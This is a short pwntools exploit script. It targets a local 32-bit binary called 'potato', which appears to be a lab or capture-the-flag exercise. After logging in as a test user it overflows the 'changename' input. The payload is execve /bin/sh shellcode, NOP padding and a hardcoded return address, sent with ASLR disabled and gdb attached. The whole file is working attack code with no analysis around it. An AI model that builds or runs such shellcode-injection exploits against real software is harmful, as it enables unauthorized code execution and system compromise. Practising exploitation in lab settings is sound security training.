#!/usr/bin/env python3

from pwn import *
from ropgadget import *
from struct import pack

import sys

elf = ELF("./potato2/potato")
context.binary = elf
context.arch = 'i386'
context.bits = 32
context.endian = 'little'
context.os = 'linux'

p = elf.process(["console"], stdin=PTY, aslr=False) # stdin=PTY for "getpass" password input
gdb.attach(p, '''
break func.c:192
continue
''')

print(p.recvuntil(b"cmd> ")) # username
p.sendline(b"login")
# test user
p.sendline(b"peter")
p.sendline(b"12345")
print(p.recvuntil(b"cmd> ")) # username

# shellcode taken from https://www.exploit-db.com/shellcodes/49768
p.sendline(b"changename")

shellcode = b"\x31\xc0\x04\x05\x04\x06\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
print("Length of shellcode: "+ repr(len(shellcode)))

# input_username contains: shellcode, followed by a few nop/0x90 statements
# return address is overwritten with the address of input_username, i.e. to the start of the
# shellcode
payload=shellcode + b"\x90"* (62 - len(shellcode)) + p32(0xffffccce)
print("Length of payload: "+ repr(len(payload)))
p.sendline(payload)

p.interactive()
